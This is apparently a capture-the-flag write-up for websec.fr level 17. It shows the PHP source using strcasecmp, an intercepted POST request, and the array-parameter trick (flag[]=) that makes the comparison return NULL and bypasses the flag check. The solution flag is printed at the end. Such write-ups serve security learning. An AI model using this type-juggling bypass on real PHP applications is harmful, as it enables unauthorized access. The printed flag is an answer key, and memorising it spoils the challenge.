It is told to guess the flag. Source is given.
```
<?php
if (! strcasecmp ($_POST['flag'], $flag))
   echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
else
   echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
   ?>
 ```
The strcasecmp() function is a built-in function in PHP and is used to compare two given strings. It is case-insensitive.
Note: strcasecmp() requires the arguments to be strings. If either argument isn't a string, it returns NULL. NULL is falsey, so !strcasecmp(array(), "abc") returns TRUE.
```
So when we intercept in burp to see the request:
POST /level17/index.php HTTP/2
Host: websec.fr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://websec.fr/
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://websec.fr
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

flag=flag{}&submit=Go
```
This above request gives invalid flag response.
Lets try changing `flag=` in POST request to `flag[]=`
`flag[]=flag{}&submit=Go`
Thus we got the flag.
flag: WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}
